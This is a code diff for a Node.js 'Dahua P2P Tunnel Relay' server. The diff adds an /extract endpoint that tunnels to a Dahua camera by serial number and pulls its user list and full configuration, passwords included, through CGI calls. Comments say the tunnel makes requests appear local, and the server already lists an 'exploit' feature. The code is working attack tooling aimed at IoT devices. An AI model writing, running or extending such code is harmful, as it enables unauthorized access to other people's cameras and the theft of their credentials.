@@ -1036,7 +1036,7 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '4.14', features: ['status','tunnel','cgi','debug','debug_full','exploit','check_auth'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '4.15', features: ['status','tunnel','cgi','debug','debug_full','exploit','check_auth','extract'] }));
   }
 
   if (req.url.startsWith('/debug/') && req.method === 'GET') {
@@ -1270,6 +1270,48 @@ var server = http.createServer(async function(req, res) {
     } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
   }
 
+  // v4.15: Extract device data — one tunnel, multiple CGI queries
+  // Returns: serial, device_type, firmware, hardware, users, config (passwords)
+  // Handles 401 with digest auth. P2P tunnel makes requests appear as 127.0.0.1 (local).
+  if (req.url === '/extract' && req.method === 'POST') {
+    try {
+      var ep = JSON.parse(await readBody(req));
+      if (!ep.serial || ep.serial.length < 10) { res.writeHead(400); return res.end(JSON.stringify({error:'Serial too short'})); }
+      var eTargetPort = ep.target_port || 80;
+      var eTunnel = await establishTunnel(ep.serial, ep.username, ep.password, eTargetPort);
+      var cgiPaths = [
+        { key: 'serial', path: '/cgi-bin/magicBox.cgi?action=getSerialNo' },
+        { key: 'device_type', path: '/cgi-bin/magicBox.cgi?action=getDeviceType' },
+        { key: 'firmware', path: '/cgi-bin/magicBox.cgi?action=getSoftwareVersion' },
+        { key: 'hardware', path: '/cgi-bin/magicBox.cgi?action=getHardwareVersion' },
+        { key: 'users', path: '/cgi-bin/userManager.cgi?action=getUsers' },
+        { key: 'config', path: '/cgi-bin/configManager.cgi?action=getConfig&name=All' },
+      ];
+      var eResults = {};
+      for (var ei = 0; ei < cgiPaths.length; ei++) {
+        try {
+          var eRealmId = await bindTunnelPort(eTunnel.deviceSock, eTargetPort);
+          var eHeaders = {};
+          var eResp = await sendHTTPThroughTunnel(eTunnel.deviceSock, eRealmId, cgiPaths[ei].path, 'GET', eHeaders, '');
+          if (eResp.status === 401 && ep.username && ep.password) {
+            var eWwwAuth = eResp.headers['WWW-Authenticate'] || eResp.headers['www-authenticate'];
+            if (eWwwAuth) {
+              var eDp = parseDigestAuth(eWwwAuth);
+              eHeaders['Authorization'] = buildDigestAuth('GET', cgiPaths[ei].path, eDp, ep.username, ep.password);
+              eRealmId = await bindTunnelPort(eTunnel.deviceSock, eTargetPort);
+              eResp = await sendHTTPThroughTunnel(eTunnel.deviceSock, eRealmId, cgiPaths[ei].path, 'GET', eHeaders, '');
+            }
+          }
+          eResults[cgiPaths[ei].key] = { status: eResp.status, body: eResp.body.substring(0, 8000) };
+        } catch(ee) {
+          eResults[cgiPaths[ei].key] = { error: ee.message };
+        }
+      }
+      eTunnel.deviceSock.close(); eTunnel.mainSock.close();
+      res.writeHead(200); return res.end(JSON.stringify(eResults));
+    } catch(e) { res.writeHead(500); return res.end(JSON.stringify({error:e.message})); }
+  }
+
   var serial = req.url.replace(/^\//, '').split('?')[0];
   if (serial && serial.length >= 10) {
     try { var r = await checkP2P(serial); res.writeHead(200); return res.end(JSON.stringify(r)); }
@@ -1282,5 +1324,5 @@ process.on('uncaughtException', function(e) { console.error('[FATAL]', e.message
 process.on('unhandledRejection', function(e) { console.error('[FATAL]', e); });
 
 server.listen(PORT, function() {
-  console.log('Dahua P2P Tunnel Relay v4.14 running on port ' + PORT);
+  console.log('Dahua P2P Tunnel Relay v4.15 running on port ' + PORT);
 });
